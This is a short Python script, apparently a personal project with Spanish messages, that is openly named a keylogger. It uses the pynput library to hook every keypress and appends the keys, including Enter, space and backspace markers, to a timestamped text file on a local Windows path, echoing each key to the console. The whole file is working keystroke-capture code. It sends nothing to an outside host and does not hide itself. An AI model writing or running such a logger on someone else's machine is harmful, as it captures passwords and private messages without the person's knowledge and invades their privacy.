import datetime
import os
from pynput.keyboard import Listener

d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
file_path = os.path.join('c:/OscarDev/proyectos_p/Python/', 'keylogger_{}.txt'.format(d))
print(f"Archivo de registro: {file_path}")

def key_recorder(key):
    key = str(key)
    print(f"Tecla presionada: {key}")
    
    try:
        with open(file_path, 'a') as f:
            if key == 'Key.enter':
                f.write('\n')
            elif key == 'Key.space':
                f.write(' ')
            elif key == 'Key.backspace':
                f.write('%BORRAR%')
            else:
                f.write(key.replace("'", ""))
    except Exception as e:
        print(f"Error al escribir en el archivo: {e}")

with Listener(on_press=key_recorder) as l:
    l.join()
